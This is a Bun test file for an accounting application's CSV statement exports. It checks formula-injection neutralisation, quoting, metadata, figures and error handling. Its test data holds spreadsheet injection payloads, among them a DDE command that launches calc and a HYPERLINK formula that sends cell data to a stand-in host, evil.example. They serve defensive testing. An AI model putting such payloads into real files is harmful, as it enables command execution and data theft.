import { describe, expect, test } from "bun:test";
import { isMoney, parseMoney } from "../src/money.ts";
import { compileReports } from "../src/reports.ts";
import { compileCashFlow } from "../src/reports/cash-flow.ts";
import { amount, neutralize, render, text } from "../src/reports/csv.ts";
import { exportStatement, type ExportRequest } from "../src/reports/export.ts";
import { failure } from "./support/helpers.ts";
import { KernelBook } from "./support/kernel-book.ts";
import { CHART, Scenario, generate } from "./support/scenario.ts";
import { FULL_TAGS, tagMap } from "./support/tags.ts";

/** A small RFC 4180 reader, written independently of the writer so the two can disagree. */
function parse(csv: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  let started = false;
  for (let index = 0; index < csv.length; index++) {
    const char = csv[index] as string;
    if (quoted) {
      if (char === '"') {
        if (csv[index + 1] === '"') {
          cell += '"';
          index++;
        } else quoted = false;
      } else cell += char;
    } else if (char === '"') {
      quoted = true;
      started = true;
    } else if (char === ",") {
      row.push(cell);
      cell = "";
      started = true;
    } else if (char === "\r" && csv[index + 1] === "\n") {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = "";
      started = false;
      index++;
    } else {
      cell += char;
      started = true;
    }
  }
  if (started || cell !== "") {
    row.push(cell);
    rows.push(row);
  }
  return rows;
}

const FORMULA_START = /^[=+\-@\t\r\n]/;
const PAYLOADS = [
  "=1+1",
  "+1+1",
  "-2+3",
  "@SUM(1+1)",
  "=cmd|' /C calc'!A0",
  '=HYPERLINK("http://evil.example/?x="&A1,"click")',
  "\t=1+1",
  "\r=1+1",
  "\n=1+1",
  "=",
  "-",
  "@",
];

describe("CSV cells", () => {
  test("a text cell that could run as a formula gets a leading quote, and nothing else changes", () => {
    for (const payload of PAYLOADS) {
      expect(neutralize(payload), JSON.stringify(payload)).toBe(`'${payload}`);
      expect(FORMULA_START.test(neutralize(payload))).toBe(false);
    }
    for (const safe of [
      "Cash",
      "1000",
      "2026-06-30",
      " =1+1",
      "a=b",
      "x+y",
      "'=1+1",
      "",
      "Ünïcode",
      "é=1",
    ])
      expect(neutralize(safe), JSON.stringify(safe)).toBe(safe);
    // Neutralising twice would add a second quote, so it is applied exactly once, at the cell.
    expect(text("=1+1")).toBe("'=1+1");
  });

  test("a cell with a comma, a quote or a line break is quoted, and survives a round trip", () => {
    const values = [
      "plain",
      "a,b",
      'say "hi"',
      "two\nlines",
      "carriage\rreturn",
      '="x",1',
      ",",
      '"',
    ];
    const csv = render([values.map(text)]);
    expect(parse(csv)).toEqual([values.map((value) => neutralize(value))]);
    expect(csv.endsWith("\r\n")).toBe(true);
    expect(text("a,b")).toBe('"a,b"');
    expect(text('say "hi"')).toBe('"say ""hi"""');
    expect(text("=a,b")).toBe('"\'=a,b"');
  });

  test("a money cell is a plain decimal, so a negative figure stays a number, and anything else is refused", () => {
    expect(amount("-1200.00")).toBe("-1200.00");
    expect(amount("0.00")).toBe("0.00");
    expect(amount("1234567890123.45")).toBe("1234567890123.45");
    for (const bad of [
      "=1+1",
      "1,000.00",
      "12.3",
      "1e3",
      " 1.00",
      "1.00 ",
      "+1.00",
      "--1.00",
      "",
      "NaN",
      "1.000",
    ])
      expect(() => amount(bad), JSON.stringify(bad)).toThrow(TypeError);
  });
});

/** A book whose every piece of free text is hostile: the book name, account names and narrations. */
function hostileBook() {
  const accounts = [
    { code: "1000", role: "asset" as const, name: '=HYPERLINK("http://evil.example","Cash")' },
    { code: "1100", role: "asset" as const, name: "+receivables" },
    { code: "2000", role: "liability" as const, name: '-payables, "quoted"' },
    { code: "3000", role: "equity" as const, name: "@capital" },
    { code: "4000", role: "income" as const, name: "\t=sales" },
    { code: "5000", role: "expense" as const, name: "line\nbreak" },
  ];
  const book = new KernelBook({ firstYear: 2025, years: 1, accounts });
  const scenario = new Scenario(book);
  let index = 0;
  const post = (lines: [string, bigint][]) =>
    scenario.post(
      `2025-03-${String(10 + index).padStart(2, "0")}`,
      lines,
      PAYLOADS[index++] ?? "ok",
    );
  post([
    ["1000", 500_00n],
    ["3000", -500_00n],
  ]);
  post([
    ["1100", 120_00n],
    ["4000", -120_00n],
  ]);
  post([
    ["5000", 40_00n],
    ["2000", -40_00n],
  ]);
  post([
    ["2000", 15_00n],
    ["1000", -15_00n],
  ]);
  return book.state;
}

const request = (
  statement: ExportRequest["statement"],
  extra: Partial<ExportRequest> = {},
): ExportRequest => ({
  statement,
  asOf: "2025-06-30",
  bookName: '=cmd|" /C calc"!A0',
  tags: tagMap({ "1000": "cash", "1100": "operating", "2000": "operating", "3000": "financing" }),
  ...extra,
});

describe("statement exports", () => {
  const statements = [
    "trial-balance",
    "profit-loss",
    "balance-sheet",
    "cash-flow",
    "general-ledger",
  ] as const;

  test("no cell of any export can run as a formula, whatever the book says", () => {
    const state = hostileBook();
    for (const statement of statements)
      for (const compare of [undefined, "previousPeriod"] as const) {
        const file = exportStatement(state, request(statement, compare ? { compare } : {}));
        const rows = parse(file.content);
        expect(rows.length, statement).toBeGreaterThan(8);
        for (const row of rows)
          for (const cell of row) {
            if (cell === "") continue;
            // Every cell is either neutralised text or a plain money figure.
            expect(
              FORMULA_START.test(cell) && !isMoney(cell),
              `${statement}: ${JSON.stringify(cell)}`,
            ).toBe(false);
          }
        // The hostile text is still there, as text: it was neutralised, not dropped. The book name is
        // in every file; the account names are in the statements that list those accounts.
        const cells = rows.flat();
        expect(cells, statement).toContain('\'=cmd|" /C calc"!A0');
        expect(
          cells.some((cell) => cell.startsWith("'") && FORMULA_START.test(cell.slice(1))),
          statement,
        ).toBe(true);
        if (statement === "trial-balance") {
          for (const expected of [
            '\'=HYPERLINK("http://evil.example","Cash")',
            "'+receivables",
            '\'-payables, "quoted"',
            "'@capital",
            "'\t=sales",
            "line\nbreak",
          ])
            expect(cells, expected).toContain(expected);
        }
      }
  });

  test("the file says which book revision, range, basis and population it came from", () => {
    const state = threeYearsState();
    for (const statement of statements) {
      const file = exportStatement(state, {
        ...request(statement),
        bookName: "Example Co",
        asOf: "2025-09-30",
      });
      const rows = parse(file.content);
      const meta = new Map(
        rows
          .slice(0, 12)
          .filter((row) => row.length === 2)
          .map(([key, value]) => [key, value]),
      );
      const report = compileReports(state, "2025-09-30", {});
      expect(meta.get("Report")).toBe(
        {
          "trial-balance": "Trial balance",
          "profit-loss": "Profit and loss",
          "balance-sheet": "Balance sheet",
          "cash-flow": "Cash flow statement",
          "general-ledger": "General ledger",
        }[statement],
      );
      expect(meta.get("Book")).toBe("Example Co");
      expect(meta.get("Currency")).toBe("USD");
      expect(meta.get("Basis")).toBe("accrual");
      expect(meta.get("Book revision")).toBe(report.bookRevision);
      expect(meta.get("Compiler version")).toMatch(/^rastrata-/);
      expect(meta.get("Population hash")).toBe(file.populationHash);
      expect(file.bookRevision).toBe(report.bookRevision);
      expect(file.mediaType).toBe("text/csv; charset=utf-8");
    }
    // The file name is fixed words and dates only.
    expect(exportStatement(state, request("trial-balance")).filename).toBe(
      "trial-balance-2025-06-30.csv",
    );
    expect(exportStatement(state, { ...request("profit-loss"), from: "2025-04-01" }).filename).toBe(
      "profit-loss-2025-04-01-to-2025-06-30.csv",
    );
    expect(exportStatement(state, request("cash-flow")).filename).toBe(
      "cash-flow-2025-01-01-to-2025-06-30.csv",
    );
    for (const statement of statements)
      expect(exportStatement(state, request(statement)).filename).toMatch(
        /^[a-z]+(-[a-z]+)*-\d{4}-\d{2}-\d{2}(-to-\d{4}-\d{2}-\d{2})?\.csv$/,
      );
  });

  test("the figures in the file are the figures of the statement", () => {
    const state = threeYearsState();
    const report = compileReports(state, "2025-09-30", { from: "2025-02-01" });
    const read = (statement: ExportRequest["statement"], extra: Partial<ExportRequest> = {}) =>
      parse(
        exportStatement(state, {
          ...request(statement, extra),
          asOf: "2025-09-30",
          from: "2025-02-01",
        }).content,
      );
    const table = (rows: string[][], first: string) =>
      rows.slice(rows.findIndex((row) => row[0] === first));

    const profit = table(read("profit-loss"), "Account ID");
    for (const entry of report.profitAndLoss.rows)
      expect(profit.find((row) => row[0] === entry.accountId)?.slice(1)).toEqual([
        entry.code,
        entry.name,
        entry.role,
        entry.amount,
      ]);
    expect(profit.find((row) => row[2] === "Net income")?.[4]).toBe(report.profitAndLoss.netIncome);

    const sheet = table(read("balance-sheet"), "Account ID");
    for (const entry of report.balanceSheet.rows)
      expect(sheet.find((row) => row[0] === entry.accountId)?.[4]).toBe(entry.amount);
    expect(sheet.find((row) => row[2] === "Total equity")?.[4]).toBe(report.balanceSheet.equity);
    expect(sheet.find((row) => row[2]?.startsWith("Difference"))?.[4]).toBe("0.00");

    const trial = table(read("trial-balance"), "Account ID");
    for (const entry of report.trialBalance.rows)
      expect(trial.find((row) => row[0] === entry.accountId)?.slice(4)).toEqual([
        entry.signedBalance,
        entry.debit,
        entry.credit,
      ]);
    const totalRow = trial.find((row) => row[2] === "Total");
    expect(totalRow?.slice(5)).toEqual([report.trialBalance.debit, report.trialBalance.credit]);
    // The trial balance totals in the file balance, read back from the text.
    const debits = trial
      .filter((row) => row[0] !== "" && isMoney(row[5] ?? ""))
      .reduce((sum, row) => sum + parseMoney(row[5] as string), 0n);
    expect(debits).toBeGreaterThan(0n);
  });

  test("a comparison adds Comparative and Change columns, and no comparison leaves them out", () => {
    const state = threeYearsState();
    const plain = parse(
      exportStatement(state, { ...request("profit-loss"), asOf: "2025-09-30" }).content,
    );
    const compared = parse(
      exportStatement(state, {
        ...request("profit-loss"),
        asOf: "2025-09-30",
        compare: "previousYear",
      }).content,
    );
    expect(plain.find((row) => row[0] === "Account ID")).toEqual([
      "Account ID",
      "Code",
      "Account",
      "Type",
      "Amount",
    ]);
    expect(compared.find((row) => row[0] === "Account ID")).toEqual([
      "Account ID",
      "Code",
      "Account",
      "Type",
      "Amount",
      "Comparative",
      "Change",
    ]);
    const net = compared.find((row) => row[2] === "Net income");
    const json = compileReports(state, "2025-09-30", { compare: "previousYear" });
    const total = json.profitAndLoss.totals.find((item) => item.key === "netIncome");
    expect(net?.slice(4)).toEqual([
      total?.amount ?? "",
      total?.comparative ?? "",
      total?.change ?? "",
    ]);
  });

  test("the cash-flow file lists sections, totals and cash accounts, and says when it is unavailable", () => {
    const state = threeYearsState();
    const rows = parse(
      exportStatement(state, {
        ...request("cash-flow"),
        asOf: "2025-09-30",
        tags: tagMap(FULL_TAGS),
      }).content,
    );
    const statement = compileCashFlow(state, "2025-09-30", { tags: tagMap(FULL_TAGS) });
    expect(rows.find((row) => row[3] === "Net income")?.[4]).toBe(
      statement.sections[0]?.lines[0]?.amount,
    );
    expect(rows.find((row) => row[3] === "Net change in cash")?.[4]).toBe(
      statement.netChange ?? "",
    );
    expect(rows.find((row) => row[3] === "Cash at the end of the period")?.[4]).toBe(
      statement.closingCash ?? "",
    );
    expect(rows.some((row) => row[0] === "Cash accounts")).toBe(true);
    expect(rows.find((row) => row[0] === "Tag map hash")?.[1]).toBe(statement.tagMapHash);
    const none = parse(
      exportStatement(state, { ...request("cash-flow"), asOf: "2025-09-30", tags: tagMap({}) })
        .content,
    );
    expect(none.find((row) => row[0] === "Not available")?.[1]).toMatch(
      /No account is tagged as cash/,
    );
    // An untagged account's warning is in the file too.
    const partial = parse(
      exportStatement(state, {
        ...request("cash-flow"),
        asOf: "2025-09-30",
        tags: tagMap({ ...FULL_TAGS, "1100": undefined }),
      }).content,
    );
    expect(
      partial.some((row) => row[0] === "Warning" && /no cash-flow tag/.test(row[1] ?? "")),
    ).toBe(true);
  });

  test("the general ledger file holds every line with opening and closing balances, not one page", () => {
    const state = threeYearsState();
    const file = exportStatement(state, {
      ...request("general-ledger"),
      asOf: "2025-12-31",
      from: "2025-01-01",
    });
    const rows = parse(file.content);
    const lines = rows.filter((row) => row[0] === "line");
    const scenario = threeYearsScenario();
    expect(lines.length).toBe(
      scenario.entries.filter((entry) => entry.date >= "2025-01-01" && entry.date <= "2025-12-31")
        .length,
    );
    expect(lines.length).toBeGreaterThan(100);
    expect(rows.filter((row) => row[0] === "opening").length).toBe(
      rows.filter((row) => row[0] === "closing").length,
    );
    // Debit and credit columns of the line rows sum to equal totals, because every journal balances.
    const sum = (column: number) =>
      lines.reduce((all, row) => all + parseMoney(row[column] as string), 0n);
    expect(sum(6)).toBe(sum(7));
  });

  test("a file too large to return is refused with advice, not truncated", () => {
    const state = threeYearsState();
    const error = failure(() => {
      exportStatement(state, { ...request("general-ledger"), asOf: "2025-12-31" }, 1_000);
    });
    expect(error.code).toBe("export_too_large");
    expect(error.status).toBe(413);
    expect(error.message).toMatch(/shorter date range/);
  });

  test("a basis the book does not keep, or a date outside its calendar, is an error, never a file", () => {
    const state = threeYearsState();
    expect(
      failure(() => exportStatement(state, { ...request("profit-loss"), basis: "cash" })).code,
    ).toBe("basis_unavailable");
    expect(
      failure(() => exportStatement(state, { ...request("balance-sheet"), asOf: "2031-01-01" }))
        .code,
    ).toBe("calendar_not_configured");
    expect(CHART.length).toBeGreaterThan(0);
  });
});

let scenario: Scenario | undefined;
function threeYearsScenario(): Scenario {
  scenario ??= generate(7, { firstYear: 2024, years: 3 });
  return scenario;
}
const threeYearsState = () => threeYearsScenario().book.state;
